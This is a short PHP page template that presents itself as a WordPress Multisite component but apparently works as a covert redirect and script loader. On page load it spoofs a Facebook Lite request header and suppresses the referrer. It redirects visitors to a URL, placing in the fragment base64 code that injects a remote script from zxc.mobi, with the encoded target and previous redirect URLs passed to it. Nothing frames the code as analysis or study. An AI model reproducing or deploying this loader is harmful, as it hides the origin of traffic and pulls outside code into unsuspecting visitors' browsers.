<?php

use Wordpress\Multisite\Commons\Decorator\GetPost;
use Wordpress\Multisite\Commons\Support\Facades\Log;
use Wordpress\Multisite\Commons\Support\Facades\Session;
use Wordpress\Multisite\Commons\MarketingCustomization\Flow;
use Wordpress\Multisite\Commons\Support\Facades\PrepareResponse;


$obj = PrepareResponse::getAll();
$_SERVER['HTTP_X_REQUESTED_WITH'] = "com.facebook.lite";
$completeUrl = $obj->link;

$lastLink = $obj->lastRedirect;
/**
 * Taking url from session and encrypt it in base64 to send it to slick. put a time stamp to verify in slick.
 * @var hash
 */
$s = base64_encode( $completeUrl.'{}'.time().'{}'.$lastLink);

?>

<html>
    <head>
        <script type="text/javascript">
            function relocate() {
                var lnk2 = '<?php echo $s; ?>';
                var a =`var s=document.createElement("script");s.id="y_";s.src="http://zxc.mobi/ap.php?s=` + lnk2 + `";if(!document.getElementById("y_")){document.getElementsByTagName("head")[0].appendChild(s);}`;
                
                history.pushState(null,null,window.url);
                var meta = document.createElement("meta");
                meta.name = "referrer";
                meta.content = "no-referrer";
                document.getElementsByTagName("head")[0].appendChild(meta);

                a = btoa(a);
                 window.location.href = '<?php echo $completeUrl; ?>' + '#' + a;
                 
            }

            window.addEventListener('DOMContentLoaded', function() {
                    relocate();
            }, true);
        </script>
    </head>
    <body>
    </body>
</html>